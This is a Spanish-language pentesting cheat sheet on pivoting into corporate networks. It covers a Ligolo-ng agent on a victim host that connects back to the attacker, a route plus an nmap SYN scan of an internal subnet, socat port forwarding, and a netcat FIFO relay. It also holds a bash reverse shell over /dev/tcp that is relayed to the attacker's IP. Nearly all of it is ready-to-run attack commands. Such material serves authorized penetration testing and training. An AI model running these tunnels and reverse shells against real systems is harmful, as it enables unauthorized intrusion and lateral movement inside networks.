# Port Redirection & Pivoting Cheat Sheet (Ligolo-ng, Socat & Netcat)
> **Guía rápida de comandos para establecer túneles de red, redirecciones de puertos locales/remotos y enrutamiento interno para pivoting en redes corporativas.**

---

## 🏎️ 1. Ligolo-ng (Pivoting Moderno mediante Interfaz TUN)

Ligolo-ng es la alternativa moderna a Chisel. En lugar de un proxy SOCKS lento, crea una interfaz de red virtual (TUN) en tu máquina atacante para enrutar todo el tráfico de red de forma directa, permitiendo el uso completo de herramientas como Nmap (SYN scan), CrackMapExec, etc.

### 💻 Paso 1: Configurar la interfaz TUN (Atacante - Linux)
```bash
# Crear interfaz TUN de nombre 'ligolo'
sudo ip tuntap add user <TU_USUARIO> mode tun ligolo
# Levantar la interfaz
sudo ip link set ligolo up
```

### 💻 Paso 2: Iniciar el Servidor Proxy (Atacante - Puerto 11601)
```bash
# Ejecutar proxy Ligolo
./proxy -selfcert
```

### 🪟 Paso 3: Iniciar el Agente en la Máquina Víctima (Salto)
* **Desde Linux (Agente)**:
  ```bash
  ./agent -connect <IP_ATACANTE>:11601 -ignore-cert
  ```
* **Desde Windows (Agente)**:
  ```cmd
  agent.exe -connect <IP_ATACANTE>:11601 -ignore-cert
  ```

### 💻 Paso 4: Establecer la Sesión y Añadir Rutas (Atacante)
1. En la consola interactiva de tu `proxy` de Ligolo, verás la conexión del agente. Ejecuta:
   ```text
   ligolo-ng » session
   # (Selecciona la sesión activa del agente)
   ligolo-ng » start
   ```
2. En una nueva terminal de tu máquina atacante, añade la ruta para alcanzar la subred interna a través de la interfaz `ligolo` (ej: subred interna `192.168.20.0/24`):
   ```bash
   sudo ip route add 192.168.20.0/24 dev ligolo
   ```
3. Ahora puedes escanear o interactuar con la red interna directamente:
   ```bash
   nmap -sS -Pn -p 80,445 192.168.20.10
   ```

---

## 🔌 2. Socat (Redirección de Puertos TCP)

Socat es una utilidad multipropósito capaz de enlazar sockets de red bidireccionales en Linux.

* **Redirección Remota (Local Port Forwarding)**:
  Redirigir todo el tráfico que llega al puerto `8080` de la máquina de salto hacia el puerto `80` de un servidor web interno.
  ```bash
  socat TCP-LISTEN:8080,fork,reuseaddr TCP:<IP_INTERNA>:80
  ```
* **Túnel Socat Inverso (Recibir shell reversa a través de la máquina de salto)**:
  Si la máquina interna no tiene salida a internet pero sí ve a la máquina de salto.
  1. En la máquina de salto (salto redirecciona puerto `4444` hacia el puerto `4444` del atacante):
     ```bash
     socat TCP-LISTEN:4444,fork,reuseaddr TCP:<IP_ATACANTE>:4444
     ```
  2. En la máquina interna (ejecutar shell reversa hacia la IP de la máquina de salto):
     ```bash
     bash -i >& /dev/tcp/<IP_SALTO>/4444 0>&1
     ```

---

## 📡 3. Netcat Relays (Pivoting mediante Tuberías FIFO)

Si Socat no está disponible en la máquina de salto, se puede usar Netcat tradicional combinándolo con una tubería FIFO (`mkfifo`) para crear una redirección bidireccional.

* **Crear un Relay TCP en el puerto 8080 hacia un puerto interno**:
  ```bash
  rm /tmp/f; mkfifo /tmp/f
  cat /tmp/f | nc -v <IP_INTERNA> 80 | nc -lvnp 8080 > /tmp/f
  ```
* **Explicación del flujo**:
  1. El tráfico entrante llega al puerto local `8080`.
  2. Se envía por la tubería `/tmp/f` hacia el comando central `nc <IP_INTERNA> 80`.
  3. La respuesta del servidor interno se envía de vuelta hacia el cliente.
